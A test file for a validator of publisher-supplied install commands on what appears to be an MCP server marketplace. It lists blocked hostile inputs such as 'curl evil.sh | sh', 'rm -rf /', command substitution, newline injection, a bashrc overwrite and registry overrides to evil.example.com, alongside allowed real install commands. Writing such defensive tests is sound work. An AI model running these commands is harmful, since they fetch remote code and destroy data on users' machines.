import { describe, it, expect } from "vitest";
import { validateInstallCommand, ALLOWED_INSTALL_LAUNCHERS } from "../server/routes/servers.js";

// A buyer pastes install_command into their own terminal. A hostile publisher
// writing this field is therefore writing code on someone else's machine — the
// single highest-severity input in the product.
describe("install_command — hostile publisher", () => {
  const blocked = [
    ["chained rm",              "npx foo; rm -rf ~"],
    ["and-chained curl to sh",  "npx foo && curl evil.sh | sh"],
    ["command substitution",    "npx foo $(whoami)"],
    ["backtick substitution",   "npx foo `id`"],
    ["brace expansion",         "npx foo ${HOME}"],
    ["newline injection",       "npx foo\nrm -rf /"],
    ["redirect over bashrc",    "npx foo > ~/.bashrc"],
    ["hostile npm registry",    "npx foo --registry=http://evil.example.com"],
    ["pip index override",      "pip install x --index-url http://evil.example.com"],
    ["non-allowlisted launcher","npm i -g totally-not-a-backdoor"],
    ["bare curl",               "curl evil.example.com/x.sh"],
    ["bash launcher",           "bash -c anything"],
    ["smuggled rm, no separator","npx foo rm -rf /"],
    ["smuggled sudo",           "npx foo sudo chmod 777 /"],
    ["comment hides payload",   "npx foo # then run rm -rf /"],
  ];

  for (const [label, cmd] of blocked) {
    it(`blocks: ${label}`, () => {
      expect(validateInstallCommand(cmd)).toBeTruthy();
    });
  }

  // Breaking real publishers is not an acceptable price for security. These are
  // shapes taken from install commands live in production today.
  const allowed = [
    ["scoped npx with path", "npx -y @modelcontextprotocol/server-filesystem /path/to/allow"],
    ["plain npx",            "npx -y @playwright/mcp"],
    ["uvx",                  "uvx mcp-server-git"],
    ["pip install",          "pip install mcp-server-fetch"],
    ["docker run",           "docker run -i --rm mcp/everything"],
  ];

  for (const [label, cmd] of allowed) {
    it(`allows real install: ${label}`, () => {
      expect(validateInstallCommand(cmd)).toBeNull();
    });
  }

  it("rejects non-strings and over-long values", () => {
    expect(validateInstallCommand(null)).toBeTruthy();
    expect(validateInstallCommand(123)).toBeTruthy();
    expect(validateInstallCommand("")).toBeTruthy();
    expect(validateInstallCommand("npx " + "a".repeat(300))).toBeTruthy();
  });

  it("exposes the launcher allowlist so the UI can show it", () => {
    expect(ALLOWED_INSTALL_LAUNCHERS).toContain("npx");
    expect(ALLOWED_INSTALL_LAUNCHERS).toContain("uvx");
    expect(ALLOWED_INSTALL_LAUNCHERS).not.toContain("bash");
  });
});
